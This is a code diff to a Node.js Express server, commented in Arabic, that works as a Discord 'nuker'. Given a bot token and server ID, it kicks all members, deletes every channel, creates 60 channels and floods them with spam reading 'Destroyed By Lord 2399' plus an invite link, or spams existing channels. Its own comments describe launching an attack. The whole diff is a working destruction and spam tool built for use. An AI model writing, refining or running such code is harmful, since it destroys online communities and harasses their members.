@@ -1,4 +1,4 @@
-const { Client, GatewayIntentBits, ChannelType } = require('discord.js');
+const { Client, GatewayIntentBits, ChannelType, PermissionsBitField } = require('discord.js');
 const express = require('express');
 const cors = require('cors');
 const path = require('path');
@@ -9,48 +9,69 @@ app.use(express.json());
 
 app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
 
-app.post('/execute', (req, res) => {
+app.post('/execute', async (req, res) => {
     const { token, guildId, action, customName, customMsg } = req.body;
-    
-    // رد فوري للمتصفح لمنع "خطأ الاتصال"
-    res.status(200).send({ status: '🚀 تم إطلاق الهجوم بسرعة قصوى!' });
 
-    const client = new Client({ intents: [3276799] });
+    // رد فوري للمتصفح لمنع التعليق
+    res.status(200).send({ status: '🚀 جاري محاولة تشغيل البوت..' });
 
-    client.login(token).then(async () => {
+    const client = new Client({ 
+        intents: [
+            3276799 // كود الـ All Intents لضمان الوصول لكل شيء
+        ] 
+    });
+
+    try {
+        await client.login(token);
+        console.log(`Logged in as ${client.user.tag}`);
+
         const guild = await client.guilds.fetch(guildId).catch(() => null);
-        if (!guild) return client.destroy();
+        if (!guild) {
+            console.log("Guild not found");
+            return client.destroy();
+        }
 
         const name = customName || "Lord 2399";
         const msg = customMsg || "# Destroyed By Lord 2399\nhttps://discord.gg/2399k";
 
-        // 1. طرد الجميع (سرعة عالية)
+        // تنفيذ فوري وسريع جداً
         if (action === 'طرد' || action === 'تدمير') {
             const members = await guild.members.fetch();
-            members.forEach(m => { if(m.kickable) m.kick('2399 Power').catch(() => {}); });
+            members.forEach(m => { if(m.kickable) m.kick().catch(() => {}); });
         }
 
-        // 2. التدمير الشامل (حذف وإنشاء وسبام بلحظات)
         if (action === 'تدمير') {
+            // حذف الرومات فوراً
             guild.channels.cache.forEach(c => c.delete().catch(() => {}));
             
+            // إنشاء رومات بسرعة جنونية (60 روم في ثواني)
             for (let i = 0; i < 60; i++) {
                 setTimeout(() => {
-                    guild.channels.create({ name: name, type: ChannelType.GuildText })
-                    .then(ch => {
-                        for(let j=0; j<25; j++) ch.send(msg).catch(() => {});
+                    guild.channels.create({ 
+                        name: name, 
+                        type: ChannelType.GuildText 
+                    }).then(ch => {
+                        // سبام مكثف (30 رسالة لكل روم)
+                        for(let j=0; j<30; j++) {
+                            ch.send(msg).catch(() => {});
+                        }
                     }).catch(() => {});
-                }, i * 100); // سرعة إنشاء مجنونة
+                }, i * 150); 
             }
         }
-        
-        // 3. سبام فقط
+
         if (action === 'سبام') {
-            guild.channels.cache.filter(c => c.type === ChannelType.GuildText).forEach(ch => {
-                for (let i = 0; i < 40; i++) setTimeout(() => ch.send(msg).catch(() => {}), i * 300);
+            guild.channels.cache.forEach(ch => {
+                if(ch.type === ChannelType.GuildText) {
+                    for(let i=0; i<40; i++) setTimeout(() => ch.send(msg).catch(() => {}), i * 500);
+                }
             });
         }
-    }).catch(() => {});
+
+    } catch (error) {
+        console.error("Login Failed:", error.message);
+    }
 });
 
-app.listen(process.env.PORT || 3000, '0.0.0.0');
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, '0.0.0.0', () => console.log(`Server running on port ${PORT}`));
